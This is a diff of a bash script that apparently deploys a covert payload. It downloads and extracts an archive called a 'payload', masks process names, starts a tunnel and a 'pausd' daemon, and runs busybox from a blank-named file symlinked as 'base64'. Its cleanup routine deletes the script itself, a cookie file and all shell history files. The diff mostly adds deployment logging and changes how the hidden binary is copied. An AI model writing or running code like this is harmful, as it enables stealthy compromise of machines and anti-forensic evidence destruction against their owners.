@@ -2,7 +2,7 @@
 ## needed tmux sed grep envsubst
 
 ## load customization variables
-[ -f env.sh ] && . ./env.sh && STARTING_VARS=$(<env.sh) && rm -f env.sh
+[ -f env.sh ] && . ./env.sh && STARTING_VARS="$(<env.sh)" && rm -f env.sh
 STARTING_VARS="$STARTING_VARS pl_mask=$pl_mask pl_ep=$pl_ep pl_token=$pl_token pl_name=$pl_name"
 STARTING_PATH=${STARTING_PATH:-$PATH}
 STARTING_PID=$BASHPID
@@ -18,17 +18,14 @@ cleanup() {
         rm -rf "${p}"
     done
     IFS=$previfs
+    cp "${tmppath}/${bb}" "${tmppath}/../${bb}"
     rm -rf "$tmppath" "scripts-${BRANCH}" \
        -- "$0" \
        "dig" "cookie" "env.sh" "../env.sh" \
        "$HOME"/.*_history ~/.*_history /.*_history
     mkdir "$tmppath" && cd "$tmppath" ## now use tmppath only to store tmp bins
-    mv "../$bb" "$tmppath/"
+    cp "${tmppath}/../${bb}" "${tmppath}/${bb}"
     link_bb "$bb"
-    # [ -n "$tmppath" ] && find ${tmppath}/${dir} \
-        #                           ! -name "$OBJ_MASK" \
-        #                           ! -name "$OBJ_CFG_MASK" \
-        #                           -delete
 }
 
 pathx() {
@@ -101,8 +98,8 @@ connect-timeout = 10
         CURL_HOME=$PWD curl -sOL
         rm -f .curlrc
     fi
-    [ "${tmppath/ }" = "$tmppath" ] && { log "something is wrong with the tmppath!? aborting" && exit 1; }
-    $extract "${name}${format}" && rm "${name}${format}" || { log "problems with payload." && exit 1; }
+    [ "${tmppath/ }" = "$tmppath" ] && { echo "something is wrong with the tmppath!? aborting" && exit 1; }
+    $extract "${name}${format}" && rm "${name}${format}" || { echo "problems with payload." && exit 1; }
     # tar xf ${BRANCH}.tar.gz && rm ${BRANCH}.tar.gz
     # cd ${REPO}-${BRANCH} || exit 1
 }
@@ -122,21 +119,27 @@ bb=" "
 link_bb() {
     ln -s "$1" "base64"
 }
-cp "$(get_path busybox)" "$tmppath/../$bb" && chmod +x "$tmppath/../$bb"
+cp "$(get_path busybox)" "$tmppath/../$bb" &&
+    chmod +x "$tmppath/../$bb"
 link_bb "$tmppath/../$bb"
 
 ## choose masks
+log "deploy: masks"
 . ./masks || exit 1
 
 ## start tunnel
+log "deploy: tnl"
 . ./tstarter || exit 1
 setup_tnl
 
 ## config object
+log "deploy: objconfig"
 . ./objconfig || exit 1
 
 ## start the pausd daemon passing the object args
+log "deploy: pausd"
 . ./pausd || exit 1
+log "deploy: switch"
 . ./switch || exit 1
 
 fleep 1
